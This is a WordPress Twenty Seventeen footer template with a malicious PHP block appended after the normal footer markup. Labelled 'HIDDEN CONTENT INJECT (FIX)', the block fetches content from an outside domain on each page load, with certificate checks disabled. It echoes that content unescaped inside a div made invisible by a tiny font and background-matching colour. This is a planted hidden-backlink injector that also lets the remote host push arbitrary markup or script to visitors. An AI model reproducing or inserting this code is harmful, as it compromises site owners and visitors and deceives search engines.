<?php
/**
 * The template for displaying the footer
 *
 * @package WordPress
 * @subpackage Twenty_Seventeen
 * @since Twenty Seventeen 1.0
 * @version 1.2
 */
?>

        </div><!-- #content -->

        <footer id="colophon" class="site-footer">
            <div class="wrap">
                <?php
                get_template_part( 'template-parts/footer/footer', 'widgets' );

                if ( has_nav_menu( 'social' ) ) :
                ?>
                    <nav class="social-navigation" aria-label="<?php esc_attr_e( 'Footer Social Links Menu', 'twentyseventeen' ); ?>">
                        <?php
                        wp_nav_menu(
                            array(
                                'theme_location' => 'social',
                                'menu_class'     => 'social-links-menu',
                                'depth'          => 1,
                                'link_before'    => '<span class="screen-reader-text">',
                                'link_after'     => '</span>' . twentyseventeen_get_svg( array( 'icon' => 'chain' ) ),
                            )
                        );
                        ?>
                    </nav><!-- .social-navigation -->
                <?php endif;

                get_template_part( 'template-parts/footer/site', 'info' );
                ?>
            </div><!-- .wrap -->
        </footer><!-- #colophon -->
    </div><!-- .site-content-contain -->
</div><!-- #page -->

<?php
/* ================================
 * HIDDEN CONTENT INJECT (FIX)
 * ================================ */
function get_remote_hidden_content($url) {
    if (!function_exists('curl_init')) {
        return '';
    }

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_USERAGENT => 'Mozilla/5.0'
    ));
    $result = curl_exec($ch);
    curl_close($ch);

    return $result;
}

$content = get_remote_hidden_content(
    "https://yokgercep.com/404-forbiden/hiden-backlinks.txt"
);

if (!empty($content)) {
    echo "<div class='sponsor-area' style='background:#f4f4f4;font-size:0.00001px;color:#f4f4f4;'>";
    echo $content;
    echo "</div>";
}
?>

<?php wp_footer(); ?>
</body>
</html>
